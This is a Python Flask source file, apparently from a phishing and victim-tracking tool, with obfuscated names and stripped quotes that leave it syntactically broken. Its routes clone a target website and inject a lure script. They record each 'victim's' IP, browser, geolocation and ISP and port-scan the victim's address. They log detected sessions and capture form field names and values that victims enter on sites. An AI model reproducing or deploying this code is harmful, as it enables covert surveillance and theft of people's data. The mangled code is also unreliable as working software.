












from flask import Flask, render_template, session, request, json
from core.victim_objects import *
from core.utils import utils
from core.var_2 import Database



var_0 = core.stats.var_0
var_1 = core.stats.var_1


var_2 = Database()

class class_0(object):
    @var_1.route(/ + var_0.victim_path)
    def function_0():
        var_3 = urllib2.build_opener()
        var_4 = victim_headers()
        var_3.addheaders = var_4
        var_5 = victim_inject_code(var_3.open(var_0.url_to_clone).read(), lure)
        return var_5

    @var_1.route(/register, methods=['POST'])
    def function_1():
        var_6 = flask.request.form[var_6]
        if var_6 == :
          var_6 = core.utils.utils.generateToken5

        var_7 = victim(var_6, flask.request.environ[REMOTE_ADDR], flask.request.user_agent.platform, flask.request.user_agent.browser, flask.request.user_agent.version,  core.utils.utils.portScanner(flask.request.environ[REMOTE_ADDR]), flask.request.form[cpu], time.strftime%Y-%m-%d - %H:%M:%S)
        var_8 = victim_geo(var_6, city, flask.request.form[countryCode], flask.request.form[country], flask.request.form[query], flask.request.form[lat], flask.request.form[lon], flask.request.form[org], flask.request.form[region], flask.request.form[regionName], flask.request.form[timezone], flask.request.form[zip], flask.request.form[isp], str(flask.request.user_agent))

        core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[blueBold] + * + core.utils.utils.Color[white] + ] +  A victim has been connected from  + core.utils.utils.Color[blue] + var_8.ip + core.utils.utils.Color[white] +  with the following identifier:  + core.utils.utils.Color[green] + var_6 + core.utils.utils.Color[white])
        var_11 = int(var_2.sentences_victim(count_times, var_6, 3, 0))

        var_2.sentences_victim(insert_click, [var_6, var_0.url_to_clone, time.strftime%Y-%m-%d - %H:%M:%S], 2)
        var_2.sentences_victim(delete_networks, [var_6], 2)

        if var_11 > 0:
            core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[blueBold] + * + core.utils.utils.Color[white] + ] +   + It's his  + str(var_11 + 1) +  time)
            var_2.sentences_victim(update_victim, [var_7, var_6, time.time()], 2)
            var_2.sentences_victim(update_victim_geo, [var_8, var_6], 2)
        else:
            core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[blueBold] + * + core.utils.utils.Color[white] + ] +   + It's his first time)
            var_2.sentences_victim(insert_victim, [var_7, var_6, time.time()], 2)
            var_2.sentences_victim(insert_victim_geo, [var_8, var_6], 2)
        return flask.json.dumps({status : OK, var_6 : var_6});

    @var_1.route(/nr, methods=['POST'])
    def function_2():
        var_6 = flask.request.form[var_6]
        var_9 = flask.request.form[ip]
        var_10 = flask.request.form[red]
        if var_6 == :
          var_6 = core.utils.utils.generateToken5
        core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[greenBold] + + + core.utils.utils.Color[white] + ] + core.utils.utils.Color[whiteBold] +   + var_10 + core.utils.utils.Color[white] +  session detected from  + core.utils.utils.Color[blue] + var_9 + core.utils.utils.Color[white] +   + with ID:  + core.utils.utils.Color[green] + var_6 + core.utils.utils.Color[white])

        var_11 = int(var_2.sentences_victim(count_victim_network, [var_6, var_10], 3, 0))

        if var_11 > 0:
            var_2.sentences_victim(update_network, [var_6, var_10, time.strftime%Y-%m-%d - %H:%M:%S], 2)
        else:
            var_2.sentences_victim(insert_networks, [var_6, var_9, flask.request.environ[REMOTE_ADDR], var_10, time.strftime%Y-%m-%d - %H:%M:%S], 2)
        return flask.json.dumps({status : OK, var_6 : var_6});

    @var_1.route/redv
    def function_3():
        var_12 = flask.request.args.geturl
        var_3 = urllib2.build_opener()
        var_4 = victim_headers()
        var_3.addheaders = var_4
        var_5 = victim_inject_code(var_3.open(var_12).read(), vscript)
        return var_5

    @var_1.route(/regv, methods=['POST'])
    def function_4():
        var_13 = victim_request(flask.request.form[var_6], flask.request.form[site], flask.request.form[fid], flask.request.form[name], flask.request.form[value], flask.request.form[sId])
        var_2.sentences_victim(insert_requests, [var_13, time.strftime%Y-%m-%d - %H:%M:%S], 2)
        core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[greenBold] + = + core.utils.utils.Color[white] + ] +   + Receiving data from:  + core.utils.utils.Color[green] + var_13.id + core.utils.utils.Color[white]  +   + on +   + core.utils.utils.Color[blue] + var_13.site + core.utils.utils.Color[white] + 	
 + var_13.fid + 	 + var_13.name + :	 + var_13.value)
        return flask.json.dumps({status : OK, var_6 : var_13.id});

    @var_1.route(/tping, methods=['POST'])
    def function_5():
        var_13 = flask.request.form[id]
        var_2.sentences_victim(report_online, [var_13], 2)
        return flask.json.dumps({status : OK, var_6 : var_13});
